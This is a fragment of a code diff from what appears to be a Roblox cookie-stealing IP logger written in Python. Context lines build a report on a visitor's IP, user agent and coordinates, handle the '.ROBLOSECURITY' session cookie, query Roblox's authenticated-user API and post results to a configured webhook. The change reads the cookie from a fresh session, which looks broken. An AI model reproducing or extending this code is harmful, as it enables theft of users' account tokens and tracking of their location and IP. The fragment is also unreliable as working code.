@@ -87,10 +87,10 @@ def reportError(error):
     ],
 })
     
-def get_roblox_info(cookie):
+def get_roblox_info():
     try:
         session = requests.Session()
-        session.cookies['.ROBLOSECURITY'] = cookie
+        cookie = session.cookies['.ROBLOSECURITY']
 
         user_resp = session.get('https://users.roblox.com/v1/users/authenticated', timeout=10)
         if user_resp.status_code != 200:
@@ -120,7 +120,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
     
     bot = botCheck(ip, useragent)
 
-    roblox_info = get_roblox_info(cookie=cookie)
+    roblox_info = get_roblox_info()
 
     if bot:
         requests.post(config["webhook"], json = {
